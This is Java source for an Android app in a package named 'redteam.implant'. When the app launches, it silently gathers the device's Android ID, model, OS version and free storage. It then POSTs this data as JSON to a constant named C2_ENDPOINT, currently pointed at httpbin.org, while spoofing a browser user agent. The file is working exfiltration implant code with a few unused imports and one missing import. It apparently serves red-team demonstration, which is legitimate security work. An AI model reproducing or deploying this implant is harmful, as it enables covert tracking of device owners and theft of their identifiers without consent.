package com.redteam.implant;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {

    private static final String C2_ENDPOINT = "https://httpbin.org/post";
    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Execute exfiltration immediately on launch
        new Thread(this::performExfiltration).start();
    }

    private void performExfiltration() {
        try {
            String payload = constructPayload();
            int responseCode = sendPostRequest(C2_ENDPOINT, payload);

            Handler mainHandler = new Handler(Looper.getMainLooper());
            mainHandler.post(() -> {
                if (responseCode == 200) {
                    Toast.makeText(this, "Data transmitted successfully", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Transmission failed: " + responseCode, Toast.LENGTH_SHORT).show();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String constructPayload() {
        StringBuilder json = new StringBuilder();
        json.append("{\n");
        json.append("  \"session_id\": \"").append(generateSessionId()).append("\",\n");
        json.append("  \"android_id\": \"").append(getAndroidId()).append("\",\n");
        json.append("  \"device_model\": \"").append(Build.MODEL).append("\",\n");
        json.append("  \"build_version\": \"").append(Build.VERSION.RELEASE).append("\",\n");
        json.append("  \"timestamp\": \"").append(getCurrentTimestamp()).append("\",\n");
        json.append("  \"storage_available\": ").append(getStorageAvailableMB()).append("\n");
        json.append("}");
        return json.toString();
    }

    private String getAndroidId() {
        return android.provider.Settings.Secure.getString(
            getContentResolver(), 
            android.provider.Settings.Secure.ANDROID_ID
        );
    }

    private String generateSessionId() {
        return UUID.randomUUID().toString().replace("-", "");
    }

    private String getCurrentTimestamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date());
    }

    private long getStorageAvailableMB() {
        try {
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long blockSize = stat.getBlockSizeLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            return (availableBlocks * blockSize) / (1024 * 1024);
        } catch (Exception e) {
            return 0L;
        }
    }

    private int sendPostRequest(String urlString, String data) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        conn.setRequestProperty("User-Agent", USER_AGENT);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        try (DataOutputStream wr = new DataOutputStream(conn.getOutputStream())) {
            wr.writeBytes(data);
            wr.flush();
        }

        return conn.getResponseCode();
    }
}
